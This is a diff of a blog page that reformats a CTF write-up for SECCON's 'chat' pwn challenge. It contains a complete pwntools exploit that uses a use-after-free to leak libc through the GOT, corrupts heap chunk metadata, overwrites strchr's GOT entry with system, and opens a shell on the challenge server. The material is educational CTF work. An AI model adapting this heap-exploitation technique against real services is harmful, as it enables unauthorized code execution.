@@ -472,131 +472,129 @@ userB-&gt;message-&gt;sender | char *p_name | userC-&gt;name
 
 <p>That’s right ! If we change the <code class="highlighter-rouge">userC-&gt;name</code> pointer into <code class="highlighter-rouge">0x60302a</code>, we can start overwriting the content from <code class="highlighter-rouge">0x60302a</code>. We first filled the GOT entry of <code class="highlighter-rouge">stack_chk_fail</code> with some printable characters ( now the first character of new user name is printable ! ), then we can start hijack some GOT !</p>
 
-<p>Here I decided to hijack <code class="highlighter-rouge">strchr</code>’s GOT so when the program call <code class="highlighter-rouge">strchr(buf, 10)</code> ( <code class="highlighter-rouge">buf</code> stores our input ) it will call <code class="highlighter-rouge">system(buf)</code> instead.<br />
-```python exp_chat.py
-#!/usr/bin/env python</p>
+<p>Here I decided to hijack <code class="highlighter-rouge">strchr</code>’s GOT so when the program call <code class="highlighter-rouge">strchr(buf, 10)</code> ( <code class="highlighter-rouge">buf</code> stores our input ) it will call <code class="highlighter-rouge">system(buf)</code> instead.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
 
-<p>from pwn import *
-import subprocess
-import sys
-import time</p>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">time</span>
 
-<p>HOST = “chat.pwn.seccon.jp”
-PORT = 26895
-ELF_PATH = “./chat”
-LIBC_PATH = “/lib/x86_64-linux-gnu/libc.so.6” # ubuntu 14.04 64bit</p>
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"chat.pwn.seccon.jp"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">26895</span>
+<span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./chat"</span>
+<span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">"/lib/x86_64-linux-gnu/libc.so.6"</span> <span class="c"># ubuntu 14.04 64bit</span>
 
-<h1 id="setting">setting</h1>
-<p>context.arch = ‘amd64’
-context.os = ‘linux’
-context.endian = ‘little’
-context.word_size = 32</p>
-<h1 id="critical-debug-error-info-notset-warn-warning">[‘CRITICAL’, ‘DEBUG’, ‘ERROR’, ‘INFO’, ‘NOTSET’, ‘WARN’, ‘WARNING’]</h1>
-<p>context.log_level = ‘INFO’</p>
+<span class="c"># setting </span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
+<span class="c"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
 
-<p>elf = ELF(ELF_PATH)
-libc = ELF(LIBC_PATH)</p>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">ELF_PATH</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">LIBC_PATH</span><span class="p">)</span>
 
-<p>def my_recvuntil(s, delim):
-    res = “”
-    while delim not in res:
-        c = s.recv(1)
-        res += c
-        sys.stdout.write(c)
-        sys.stdout.flush()
-    return res</p>
+<span class="k">def</span> <span class="nf">my_recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">delim</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">while</span> <span class="n">delim</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
+        <span class="n">c</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">res</span> <span class="o">+=</span> <span class="n">c</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">res</span>
 
-<p>def myexec(cmd):
-    return subprocess.check_output(cmd, shell=True)</p>
+<span class="k">def</span> <span class="nf">myexec</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
 
-<p>def signup(name):
-    r.sendlineafter(“&gt; “, “1”)
-    r.sendlineafter(“&gt; “, name)</p>
+<span class="k">def</span> <span class="nf">signup</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
 
-<p>def signin(name):
-    r.sendlineafter(“&gt; “, “2”)
-    r.sendlineafter(“&gt; “, name)</p>
+<span class="k">def</span> <span class="nf">signin</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"2"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
 
-<p>def tweet(msg):
-    r.sendlineafter(“» “, “4”)
-    r.sendlineafter(“» “, msg)</p>
+<span class="k">def</span> <span class="nf">tweet</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="n">msg</span><span class="p">)</span>
 
-<p>def dm(user, msg):
-    r.sendlineafter(“» “, “5”)
-    r.sendlineafter(“» “, user)
-    r.sendlineafter(“» “, msg)</p>
+<span class="k">def</span> <span class="nf">dm</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">msg</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="n">user</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="n">msg</span><span class="p">)</span>
 
-<p>def signout():
-    r.sendlineafter(“» “, “0”)</p>
+<span class="k">def</span> <span class="nf">signout</span><span class="p">():</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="s">"0"</span><span class="p">)</span>
 
-<p>def change_name(name):
-    r.sendlineafter(“» “, “7”)
-    r.sendlineafter(“» “, name)</p>
+<span class="k">def</span> <span class="nf">change_name</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="s">"7"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
 
-<p>if <strong>name</strong> == “<strong>main</strong>”:</p>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = remote(HOST, PORT)
-#r = process(ELF_PATH)
+    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    <span class="c">#r = process(ELF_PATH)</span>
+    
+    <span class="n">signup</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span> <span class="c"># fastbin[0] * 2</span>
+    <span class="n">signup</span><span class="p">(</span><span class="s">"B"</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span> <span class="c"># fastbin[0] * 2</span>
+    <span class="n">signup</span><span class="p">(</span><span class="s">"C"</span><span class="o">*</span><span class="mi">30</span><span class="p">)</span> <span class="c"># fastbin[0] * 1 + fastbin[1] * 1 </span>
 
-signup("A"*4) # fastbin[0] * 2
-signup("B"*4) # fastbin[0] * 2
-signup("C"*30) # fastbin[0] * 1 + fastbin[1] * 1 
+    <span class="n">signin</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>
+    <span class="n">tweet</span><span class="p">(</span><span class="s">"aaaa"</span><span class="p">)</span> 
+    <span class="n">signout</span><span class="p">()</span>
 
-signin("A"*4)
-tweet("aaaa") 
-signout()
+    <span class="n">signin</span><span class="p">(</span><span class="s">"B"</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>
+    <span class="n">tweet</span><span class="p">(</span><span class="s">"bbbb"</span><span class="p">)</span>
+    <span class="n">dm</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">4</span><span class="p">,</span> <span class="s">"BA"</span><span class="p">)</span> <span class="c"># for creating dangling pointer</span>
+    <span class="n">dm</span><span class="p">(</span><span class="s">"C"</span><span class="o">*</span><span class="mi">30</span><span class="p">,</span> <span class="s">"BC"</span><span class="p">)</span>
+    <span class="n">signout</span><span class="p">()</span>
 
-signin("B"*4)
-tweet("bbbb")
-dm("A"*4, "BA") # for creating dangling pointer
-dm("C"*30, "BC")
-signout()
+    <span class="n">signin</span><span class="p">(</span><span class="s">"C"</span><span class="o">*</span><span class="mi">30</span><span class="p">)</span>
+    <span class="n">tweet</span><span class="p">(</span><span class="s">"cccc"</span><span class="p">)</span>
+    <span class="n">signout</span><span class="p">()</span>
 
-signin("C"*30)
-tweet("cccc")
-signout()
+    <span class="n">signin</span><span class="p">(</span><span class="s">"B"</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>
+    <span class="n">change_name</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">"</span><span class="p">)</span> <span class="c"># invalid, will remove user (user AAAA's DM become dangling pointer)</span>
+    <span class="n">signin</span><span class="p">(</span><span class="s">"C"</span><span class="o">*</span><span class="mi">30</span><span class="p">)</span>
+    <span class="n">change_name</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">"</span><span class="p">)</span> 
 
-signin("B"*4)
-change_name("\t") # invalid, will remove user (user AAAA's DM become dangling pointer)
-signin("C"*30)
-change_name("\t") 
+    <span class="n">signup</span><span class="p">(</span><span class="s">"d"</span><span class="o">*</span><span class="mi">7</span><span class="p">)</span>
+    <span class="n">signin</span><span class="p">(</span><span class="s">"d"</span><span class="o">*</span><span class="mi">7</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">):</span> <span class="c"># null out the address</span>
+        <span class="n">change_name</span><span class="p">(</span><span class="s">"d"</span><span class="o">*</span><span class="n">i</span><span class="p">)</span>
 
-signup("d"*7)
-signin("d"*7)
-for i in xrange(6,2,-1): # null out the address
-    change_name("d"*i)
+    <span class="n">malusr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">])</span>
+    <span class="n">change_name</span><span class="p">(</span><span class="n">malusr</span><span class="p">)</span> <span class="c"># AAAA's DM's sender-&gt;name will pointer to __libc_start_main@got.plt</span>
+    <span class="n">signout</span><span class="p">()</span>
 
-malusr = p64(elf.got['__libc_start_main'])
-change_name(malusr) # AAAA's DM's sender-&gt;name will pointer to __libc_start_main@got.plt
-signout()
+    <span class="c"># leak libc</span>
+    <span class="n">signin</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="s">"2"</span><span class="p">)</span> <span class="c"># show DM, leak libc</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"["</span><span class="p">)</span>
+    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">]</span>
+    <span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
 
-# leak libc
-signin("A"*4)
-r.sendlineafter("&gt;&gt; ", "2") # show DM, leak libc
-r.recvuntil("[")
-libc.address += u64(r.recv(6).ljust(8,"\x00")) - libc.symbols['__libc_start_main']
-system_addr = libc.symbols['system']
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+    <span class="n">signout</span><span class="p">()</span>
 
-log.success("libc base: "+hex(libc.address))
-log.success("system: "+hex(system_addr))
-signout()
+    <span class="c"># somehow we can overwrite an unsortbin chunk's size</span>
+    <span class="c"># enlarge the size, so we can overflow the heap buffer and fake some data structure</span>
+    <span class="n">signin</span><span class="p">(</span><span class="n">malusr</span><span class="p">)</span>
+    <span class="n">change_name</span><span class="p">(</span><span class="s">"i"</span><span class="o">*</span><span class="mi">24</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0xa1</span><span class="p">))</span>
+    <span class="n">tweet</span><span class="p">(</span><span class="s">"fuck"</span><span class="p">)</span> <span class="c"># will allocate chunk from smallbin</span>
+    <span class="n">change_name</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x40</span><span class="p">))</span> <span class="c"># make this user into right index</span>
+    <span class="n">tweet</span><span class="p">(</span><span class="s">"7"</span><span class="o">*</span><span class="mi">16</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x60302a</span><span class="p">))</span> <span class="c"># allocate chunk from unsortbin, overwrite data structure. We can now start overwriting memory from 0x60302a</span>
 
-# somehow we can overwrite an unsortbin chunk's size
-# enlarge the size, so we can overflow the heap buffer and fake some data structure
-signin(malusr)
-change_name("i"*24+p8(0xa1))
-tweet("fuck") # will allocate chunk from smallbin
-change_name(p8(0x40)) # make this user into right index
-tweet("7"*16+p64(0x60302a)) # allocate chunk from unsortbin, overwrite data structure. We can now start overwriting memory from 0x60302a
+    <span class="c"># start overwriting, we wish to overwrite strchr's got</span>
+    <span class="n">change_name</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">6</span><span class="o">+</span><span class="s">"B"</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span> <span class="c"># padding + padding + strchr's got (overwrite to system)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="s">"sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span> <span class="c"># strchr("sh", 10) --&gt; system("sh")</span>
 
-# start overwriting, we wish to overwrite strchr's got
-change_name("A"*6+"B"*8+p64(system_addr)) # padding + padding + strchr's got (overwrite to system)
-r.sendlineafter("&gt;&gt; ", "sh\x00") # strchr("sh", 10) --&gt; system("sh")
+    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 
-r.interactive()
 </code></pre></div></div>
-
-<p>```</p>
 
 <p>First time solving a 500 points pwn challenge ! WOOHOO !</p>
 
